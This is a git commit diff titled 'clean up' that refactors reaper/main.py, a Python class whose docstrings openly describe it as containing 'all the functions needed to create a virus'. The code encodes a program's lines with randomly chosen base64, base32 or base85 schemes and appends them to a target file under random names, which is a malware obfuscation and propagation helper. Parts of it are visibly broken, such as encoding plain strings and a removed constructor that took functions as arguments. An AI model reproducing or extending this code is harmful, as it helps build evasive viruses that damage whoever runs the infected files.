0ef4150345c00a6ee14e7c2cf008236cabd97cf2
Kye <kye@apacmediasolutions.com>
2023-10-18 11:49:25 -0400

    clean up

--- reaper/main.py
+++ reaper/main.py
@@ -11,7 +11,6 @@ class Reaper:
     """
     Reaper is a class that contains all the functions needed to create a virus.
 
-
     Attributes
     ----------
     random_char : function
@@ -44,54 +43,51 @@ class Reaper:
     >>> virus = Reaper()
     >>> virus.run('virus.py', 'main')
 
+    Usage2:
 
-    
-    
+    # Create a Reaper object
+    reaper = Reaper()
+
+    # Encrypt some lines of text
+    lines = ["This is a secret message", "This is another secret message"]
+    encrypted_lines, encryption_method = reaper.encrypt(lines)
+
+    # Write the encrypted lines to a file
+    with open("encrypted_file.txt", "w") as f:
+        f.writelines(encrypted_lines)
+
+    # Decrypt the lines and print them
+    with open("encrypted_file.txt", "r") as f:
+        lines = f.readlines()
+        decrypted_lines = reaper.decrypt(lines, encryption_method)
+        print(decrypted_lines)
     """
-    def __init__(
-            self,
-            random_char,
-            encrypt,
-            write_lines,
-            decrypt,
-            main
-        ):
-        self.random_char = random_char
-        self.encrypt = encrypt
-        self.write_lines = write_lines
-        self.decrypt = decrypt
-        self.main
-    
+
     def random_char(self, y):
         """Returns a random string of characters."""
-        return ''.join(random.choice(string.ascii_letters) for x in range(y))
-    
+        return ''.join(random.choice(string.ascii_letters) for _ in range(y))
+
     def encrypt(self, lines):
         """Encrypts the virus."""
         enc, i = [], random.randint(1, 4)
-        if i == 1:
-            for line in lines:
+        for line in lines:
+            if i == 1:
                 enc.append(base64.b64encode(line) + '\n')
-        elif i == 2:
-            for line in lines:
+            elif i == 2:
                 enc.append(base64.b32encode(line) + '\n')
-        elif i == 3:
-            for line in lines:
+            elif i == 3:
                 enc.append(base64.b64encode(line) + '\n')
-        elif i == 4:
-            for line in lines:
+            elif i == 4:
                 enc.append(base64.b85encode(line) + '\n')
         return enc, i
-    
+
     def write_lines(self, lines, virus):
         """Writes the encrypted virus to a file."""
         with open(virus, 'a') as op:
             op.write('strings = """')
-        with open(virus, 'a') as op:
             op.writelines(lines)
-        with open(virus, 'a') as op:
             op.write('"""')
-        
+
     def decrypt(self, lines, opt):
         """Decrypts the virus."""
         virus = self.random_char(random.randint(3, 8))
@@ -118,9 +114,7 @@ class Reaper:
     def run(self, file, name):
         """Runs the virus."""
         with open(file, 'r') as ip:
-            lines = []
-            for line in ip:
-                lines.append(line)
+            lines = [line for line in ip]
         code, opt = self.encrypt(lines)
         self.decrypt(code, opt)
         if name == "main":
